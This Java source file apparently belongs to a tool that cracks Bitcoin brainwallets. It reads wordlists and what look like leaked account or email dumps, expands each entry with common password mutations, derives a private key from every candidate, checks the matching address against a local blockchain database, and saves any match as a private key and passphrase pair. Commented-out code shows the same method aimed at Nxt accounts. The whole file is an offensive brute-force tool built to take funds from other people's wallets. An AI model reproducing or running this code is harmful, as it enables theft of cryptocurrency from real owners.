package org.address;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

import org.address.database.AddressManager;
import org.address.database.BitcoinBlockToDataBase;
import org.address.password.PasswordGenerator;
import org.address.password.PasswordGeneratorArray;
import org.ripple.power.config.Session;
import org.ripple.power.utils.FileUtils;
import org.ripple.power.utils.MathUtils;
import org.ripple.power.utils.StringUtils;

public class Test22 {

	static ArrayList<String> caches = new ArrayList<String>(100000);

	public synchronized static void add(AddressManager manager, String passPhrase) {
		if (passPhrase.indexOf("password") != -1) {
			return;
		}

		if (StringUtils.isAlphabet(passPhrase) && passPhrase.length() < 8) {
			return;
		}

		if (passPhrase.length() < 6) {
			return;
		}

		if (caches.size() > 10000) {
			caches.clear();
		}

		if (caches.contains(passPhrase)) {
			return;
		}

		caches.add(passPhrase);

		// System.out.println(passPhrase);
		try {

			// Nxt.issueAsset(accountId);
			// System.out.println("万万没想到" + accountId + "," + passPhrase);
			// FileUtils.write(new File("d://nxt_save_dic_data.txt"), accountId
			// + "," + passPhrase + "\n", true);
	
			String result = NativeSupport.getBitcoinPrivateKey(passPhrase);
			
			String tmp = result.split(",")[0];
			
			if (manager.findBlock(tmp)) {
				System.out.println("万万没想到" + result + "," + passPhrase + ","
						);
				FileUtils.write(
						new File("d://btc2_save_dic_data.txt"),
						result + "," + passPhrase + "\n", true);
			} 
		} catch (Exception ex) {
			// ex.printStackTrace();
		}
	}

	static String[] arrays = { "111111", "222222", "333333", "444444", "777",
			"666", "999", "1", "2", "3", "9", "01", "09", "1975", "1985",
			"1995", "1984", "ed", "es", "er", "s", "123", "1234", "12345",
			"123456", "1234567", "12345678", "321321", "654321", "123456789",
			"123123", "1975", "1945", "1984", "1987", "1982", "999666",
			"666999", "1"

	};

	public static void find(AddressManager manager, String name) {

		try {
			String text = null;

			text = name;
			if(text.length()==0){
				return;
			}
			
			if (MathUtils.isNan(text)) {
				return;
			}
			if(!(text.charAt(0) < '0' || text.charAt(0) > '9')){
				return;
			}
			if(text.charAt(0)=='h'||text.charAt(0)=='H'||text.charAt(0)=='i'||text.charAt(0)=='I'){
				return;
			}
			if (text.indexOf("ê") != -1 || text.indexOf("â") != -1
					|| text.indexOf("ò") != -1 || text.indexOf("-") != -1) {
				return;
			}

			if (text.length() < 5) {
				return;
			}

			// add(text+text);
			// add(text+text+text);
			if (text.startsWith("@")) {
				return;
			}

			String tmp = null;
			if (text.length() > 0) {
				if (Character.isUpperCase(text.charAt(0))) {
					add(manager,tmp = text.toLowerCase());
					add(manager,tmp + 1);
					add(manager,tmp + "!");
					add(manager,tmp + "1!");
				} else {
					add(manager,tmp = (text.substring(0, 1).toUpperCase() + text
							.substring(1, text.length()).toLowerCase()));
					add(manager,tmp + 1);
					add(manager,tmp + "!");
					add(manager,tmp + "1!");
				}
			}
			// add(text+"321");
			if (!text.equals(tmp)) {
				add(manager,text);
			}
			if (!text.endsWith(".com")) {
				// add(text+text);

				add(manager,text + text + text);
				add(manager,text + text + text + text);
				add(manager,text + text + text + text + text);
				add(manager,text + text + text + text + text + text);

				if (StringUtils.isAlphabetNumeric(text)) {
					String a = text.substring(0, 1);
					if (!StringUtils.isNumber(a)) {
						add(manager,text + text);
					}
				}
				// add(text+text+text+text+text+text+text+text);
			}

			/*
			 * String tmp1=split1(text); String tmp2=split2(text); add(tmp1);
			 * add(tmp2);
			 */
			/*
			 * add(tmp1+tmp1); add(tmp2+tmp2); add(tmp1+tmp1+tmp1+tmp1);
			 * add(tmp2+tmp2+tmp2+tmp2);
			 */
			int flag = text.indexOf("@");
			if (flag != -1) {

				String[] res = StringUtils.split(text, "@");
				if (res.length != 0) {
					String tmp1 = res[0];
					tmp = tmp1;
					if (tmp.length() > 0) {
						if (Character.isUpperCase(tmp.charAt(0))) {
							add(manager,tmp = tmp.toLowerCase());
							add(manager,tmp + 1);
					//		add(manager,tmp + "!");
					//		add(manager,tmp + "1!");
						} else {
							add(manager,tmp = (tmp.substring(0, 1).toUpperCase() + tmp
									.substring(1, tmp.length()).toLowerCase()));
							add(manager,tmp + 1);
					//		add(manager,tmp + "!");
					//		add(manager,tmp + "1!");
						}
					}
					
					if (!tmp1.equals(tmp)) {
						add(manager,tmp1);
					}

				//	add(manager,tmp1 + tmp1 + tmp1);
				//	add(manager,tmp1 + tmp1 + tmp1 + tmp1);
					/*if (StringUtils.isAlphabetNumeric(tmp1)) {
						String a = tmp1.substring(0, 1);
						if (!StringUtils.isNumber(a)) {
							add(tmp1 + tmp1);
						}
					}*/
					flag = tmp1.indexOf(",");
					if (flag != -1) {

						String[] res1 = tmp1.split(",");

						for (int j = 0; j < res1.length; j++) {

							tmp1 = res1[j];

							add(manager,tmp1);

						}
					}

				}
			}
			flag = text.indexOf(" ");
			if (flag != -1) {

				String[] res = StringUtils.split(text, " ");

				for (int i = 0; i < res.length; i++) {
					tmp = res[i];

					add(manager,tmp);

					flag = tmp.indexOf(",");
					if (flag != -1) {

						String[] res1 = StringUtils.split(tmp, ",");

						for (int j = 0; j < res1.length; j++) {

							tmp = res1[j];

							add(manager,tmp);

						}
					}

				}
			}
			flag = text.indexOf(",");
			if (flag != -1) {

				String[] res = StringUtils.split(text, ",");

				for (int i = 0; i < res.length; i++) {
					tmp = res[i];

					add(manager,tmp);

				}
			}
			flag = text.indexOf("/");
			if (flag != -1) {

				String[] res = StringUtils.split(text, "/");

				for (int i = 0; i < res.length; i++) {
					tmp = res[i];

					add(manager,tmp);

				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		// add(text + text + text + text);
		// add(text + text + text + text);
		// add(new StringBuffer(text).reverse().toString());

	}

	public static void test2(String fn) throws IOException {
		// jordan

		AddressManager manager = new AddressManager("f:\\bitcoin_data");
		String text = null;
		ArrayList<String> files = FileUtils.getAllFiles("d:\\" + fn);

		for (String file : files) {

			System.out.println(file);
			BufferedReader reader = new BufferedReader(new InputStreamReader(
					new FileInputStream(file), "utf-8"));
			HashSet<String> lists = new HashSet<String>(1000000);

			// String[] files1=StringUtils.split(file, "\\");
			Session session = new Session("btc_md5"
					+ FileUtils.getFileName(file));
			int max = session.getInt("save") == -1 ? 0 : session.getInt("save");
			for (int j = 0; (text = reader.readLine()) != null; j++) {
				if (j < max) {
					continue;
				}

				// System.out.println(text);
				text = text.trim();
				// System.out.println(text);
				if (j % 1000 == 0) {
					System.out.println(file + ":" + text + "," + j);
					session.set("save", j);
					session.save();
				}
				if (text.indexOf("\t") != -1) {
					String[] res = text.split("\t");
					for (int i = 0; i < res.length; i++) {
						if (lists.add(res[i])) {
							find(manager,res[i]);
						}
					}

				} else if (text.indexOf("#") != -1) {
					String[] res = text.split("#");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							find(manager,t);
						}
					}

				} else if (text.indexOf(",") != -1) {
					String[] res = text.split(",");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							find(manager,t);
						}
					}

				} else {
					if (lists.add(text)) {
						find(manager,text);
					}
				}
			}
			reader.close();
		}

	}

	public static String split1(String text) {

		StringBuffer sbr = new StringBuffer(512);

		char[] chars = text.toCharArray();
		for (int i = 0; i < chars.length; i++) {
			sbr.append(i + 1);
			sbr.append(chars[i]);

		}
		return sbr.toString();
	}

	public static String split2(String text) {

		StringBuffer sbr = new StringBuffer(512);

		char[] chars = text.toCharArray();
		for (int i = 0; i < chars.length; i++) {
			if (i + 1 < chars.length) {
				sbr.append(i + 1);
			}
			sbr.append(chars[i]);

		}
		return sbr.toString();
	}

	public static void main(String[] args) throws Exception {
		

		Thread threadp = new Thread() {

			public void run() {
				try {
					test2("pinyin");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		};
		threadp.start();

		Thread thread = new Thread() {

			public void run() {
				try {
					test2("finds");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		};
		thread.start();

		Thread thread2 = new Thread() {

			public void run() {
				try {
					test2("178");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		};
		thread2.start();
	}

}
